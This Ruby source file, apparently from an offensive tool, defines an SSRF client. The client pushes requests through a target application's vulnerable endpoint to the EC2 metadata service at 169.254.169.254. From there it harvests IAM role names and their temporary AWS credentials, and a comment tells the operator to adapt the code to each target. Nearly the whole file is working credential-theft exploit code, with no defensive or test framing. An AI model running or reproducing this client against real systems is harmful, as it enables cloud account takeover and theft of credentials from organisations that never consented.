# frozen_string_literal: true

require 'net/http'
require 'uri'

module Mushroom
  module Harvest
    # Drives an SSRF vector to reach the EC2 Instance Metadata Service (IMDS).
    # All network I/O is skipped in dry_run mode.
    class SsrfClient
      IMDS_CREDS_PATH = '/latest/meta-data/iam/security-credentials/'
      TIMEOUT         = 5

      def initialize(ssrf_endpoint:, config:, logger:)
        @ssrf_endpoint = ssrf_endpoint
        @config        = config
        @logger        = logger
      end

      # Use the SSRF endpoint to fetch the credential list from IMDS.
      # Returns a raw response body string or nil.
      #
      # @return [String, nil]
      def fetch_credential_names
        return nil if config.dry_run?
        raise SsrfFailed, 'No SSRF endpoint configured' unless ssrf_endpoint

        fetch_via_ssrf(IMDS_CREDS_PATH)
      end

      # Fetch the JSON credential blob for a named role via SSRF→IMDS.
      #
      # @param role_name [String]
      # @return [String, nil]
      def fetch_credentials_for(role_name:)
        return nil if config.dry_run?

        fetch_via_ssrf("#{IMDS_CREDS_PATH}#{role_name}")
      end

      private

      attr_reader :ssrf_endpoint, :config, :logger

      def fetch_via_ssrf(imds_path)
        target = URI.parse(ssrf_endpoint)
        # Encode the IMDS path as a query param — adjust to the actual SSRF
        # parameter name of the target application.
        target.query = URI.encode_www_form(url: "http://169.254.169.254#{imds_path}")

        logger.info('ssrf_client: fetching', path: imds_path)

        resp = Net::HTTP.start(target.host, target.port,
                               open_timeout: TIMEOUT, read_timeout: TIMEOUT,
                               use_ssl: target.scheme == 'https') do |http|
          http.get("#{target.path}?#{target.query}")
        end

        case resp.code.to_i
        when 200
          resp.body
        else
          logger.warn('ssrf_client: non-200', code: resp.code)
          nil
        end
      rescue SocketError, Net::OpenTimeout, Net::ReadTimeout => e
        raise SsrfFailed, "SSRF request failed: #{e.message}"
      end
    end
  end
end
